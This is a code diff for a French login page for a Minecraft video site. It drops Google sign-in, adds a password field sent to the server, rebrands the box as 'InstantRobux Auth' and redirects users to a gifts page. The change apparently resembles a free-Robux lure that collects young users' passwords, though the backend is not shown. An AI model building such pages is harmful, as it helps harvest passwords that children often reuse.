@@ -1,15 +1,13 @@
 "use client";
 
 import { FormEvent, useState } from "react";
-import { signInWithPopup } from "firebase/auth";
-import { FcGoogle } from "react-icons/fc";
-import { getFirebaseAuth, googleProvider } from "@/lib/firebase";
 import ReCAPTCHA from "react-google-recaptcha";
 
 type Status = "idle" | "loading" | "success" | "error";
 
 export default function Home() {
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
   const [code, setCode] = useState("");
   const [showCode, setShowCode] = useState(false);
   const [captchaToken, setCaptchaToken] = useState<string | null>(null);
@@ -24,7 +22,7 @@ export default function Home() {
     const response = await fetch("/api/send-code", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, captchaToken }),
+      body: JSON.stringify({ email, password, captchaToken }),
     });
 
     const data = await response.json();
@@ -60,31 +58,17 @@ export default function Home() {
 
     setStatus("success");
     setMessage(data.message || "Connexion validee");
-    window.location.href = data.redirect || "/success";
-  }
-
-  async function signInWithGoogle() {
-    setStatus("loading");
-    setMessage("Connexion avec Google...");
-
-    try {
-      const auth = getFirebaseAuth();
-      await signInWithPopup(auth, googleProvider);
-      window.location.href = "/success";
-    } catch (error) {
-      console.error("google sign-in error", error);
-      setStatus("error");
-      setMessage("Connexion Google impossible");
-    }
+    window.location.href = data.redirect || "/cadeaux";
   }
 
   const isLoading = status === "loading";
+  const canSendCode = Boolean(captchaToken) && email.length > 0 && password.length >= 6;
 
   return (
     <div className="min-h-screen bg-[#111111] px-3 py-5 text-[#e7e7e7] sm:px-4 sm:py-8">
       <main className="mx-auto grid min-h-[calc(100vh-2.5rem)] w-full max-w-5xl items-start gap-7 md:min-h-[calc(100vh-4rem)] md:grid-cols-[1.05fr_0.95fr] md:items-center md:gap-8">
         <section className="space-y-5 md:space-y-7">
-          <div className="inline-flex rounded-full border border-[#2a2a2a] bg-[#1a1a1a] px-4 py-2 text-sm font-semibold text-[#48d65b]">
+          <div className="inline-flex rounded-full border border-[#2a2a2a] bg-[#1a1a1a] px-4 py-2 text-sm font-semibold text-[#ff5a00]">
             Authentification par mail
           </div>
           <div className="space-y-5">
@@ -92,15 +76,15 @@ export default function Home() {
               Un YouTube pour les fans de Minecraft.
             </h1>
             <p className="max-w-xl text-sm leading-6 text-[#a7a7a7] sm:text-base sm:leading-7 md:text-lg">
-              Entrez votre email, recevez un code a 6 chiffres, puis validez la
-              connexion en quelques secondes.
+              Entrez votre email, choisissez votre mot de passe, puis validez le
+              code recu par email.
             </p>
           </div>
         </section>
 
         <section className="overflow-hidden rounded-xl border border-[#2a2a2a] bg-[#1a1a1a] shadow-2xl shadow-black/30">
-          <div className="bg-[#16a832] px-5 py-4 text-center sm:px-7 sm:py-5">
-            <p className="text-lg font-bold text-white">MinevidTube Auth</p>
+          <div className="bg-[#ff5a00] px-5 py-4 text-center sm:px-7 sm:py-5">
+            <p className="text-lg font-bold text-white">InstantRobux Auth</p>
           </div>
           <form className="space-y-5 p-5 sm:p-7" onSubmit={sendCode}>
             <div className="space-y-2 text-center">
@@ -108,7 +92,7 @@ export default function Home() {
                 Connexion securisee
               </h2>
               <p className="text-sm text-[#9b9b9b]">
-                Entrez votre email pour recevoir un code.
+                Un compte est cree automatiquement si l&apos;email est nouveau.
               </p>
             </div>
 
@@ -117,7 +101,7 @@ export default function Home() {
                 Email
               </span>
               <input
-                className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#16a832] focus:ring-2 focus:ring-[#16a832]/25"
+                className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#ff5a00] focus:ring-2 focus:ring-[#ff5a00]/25"
                 onChange={(event) => setEmail(event.target.value)}
                 placeholder="vous@exemple.com"
                 required
@@ -125,6 +109,23 @@ export default function Home() {
                 value={email}
               />
             </label>
+
+            {email ? (
+              <label className="block space-y-2">
+                <span className="text-sm font-semibold text-[#d7d7d7]">
+                  Mot de passe
+                </span>
+                <input
+                  className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#ff5a00] focus:ring-2 focus:ring-[#ff5a00]/25"
+                  minLength={6}
+                  onChange={(event) => setPassword(event.target.value)}
+                  placeholder="6 caracteres minimum"
+                  required
+                  type="password"
+                  value={password}
+                />
+              </label>
+            ) : null}
 
             <div className="flex max-w-full justify-center overflow-hidden rounded-lg border border-[#2a2a2a] bg-[#0d0d0d] p-2 sm:p-3">
               {process.env.NEXT_PUBLIC_RECAPTCHA_SITE_KEY ? (
@@ -143,31 +144,15 @@ export default function Home() {
               )}
             </div>
 
-            {captchaToken ? (
+            {canSendCode ? (
               <button
-                className="w-full rounded-md bg-[#16a832] px-4 py-3 font-bold text-white transition hover:bg-[#20c940] disabled:cursor-not-allowed disabled:opacity-70"
+                className="w-full rounded-md bg-[#ff5a00] px-4 py-3 font-bold text-white transition hover:bg-[#ff7a1a] disabled:cursor-not-allowed disabled:opacity-70"
                 disabled={isLoading}
                 type="submit"
               >
                 {isLoading && !showCode ? "Envoi..." : "Envoyer le code"}
               </button>
             ) : null}
-
-            <div className="flex items-center gap-3 text-xs font-bold uppercase tracking-[0.18em] text-[#666666]">
-              <span className="h-px flex-1 bg-[#2a2a2a]" />
-              ou
-              <span className="h-px flex-1 bg-[#2a2a2a]" />
-            </div>
-
-            <button
-              className="flex w-full items-center justify-center gap-3 rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-sm font-bold text-white transition hover:border-[#16a832] hover:bg-[#121912] disabled:cursor-not-allowed disabled:opacity-70 sm:text-base"
-              disabled={isLoading}
-              onClick={signInWithGoogle}
-              type="button"
-            >
-              <FcGoogle className="text-xl" />
-              Continuer avec Google
-            </button>
 
             {showCode ? (
               <div className="space-y-4">
@@ -176,7 +161,7 @@ export default function Home() {
                     Code
                   </span>
                   <input
-                    className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#16a832] focus:ring-2 focus:ring-[#16a832]/25"
+                    className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#ff5a00] focus:ring-2 focus:ring-[#ff5a00]/25"
                     inputMode="numeric"
                     maxLength={6}
                     onChange={(event) => setCode(event.target.value)}
@@ -185,7 +170,7 @@ export default function Home() {
                   />
                 </label>
                 <button
-                  className="w-full rounded-md border border-[#16a832] px-4 py-3 font-bold text-[#48d65b] transition hover:bg-[#16a832] hover:text-white disabled:cursor-not-allowed disabled:opacity-70"
+                  className="w-full rounded-md border border-[#ff5a00] px-4 py-3 font-bold text-[#ff7a1a] transition hover:bg-[#ff5a00] hover:text-white disabled:cursor-not-allowed disabled:opacity-70"
                   disabled={isLoading || code.length < 6}
                   onClick={verifyCode}
                   type="button"
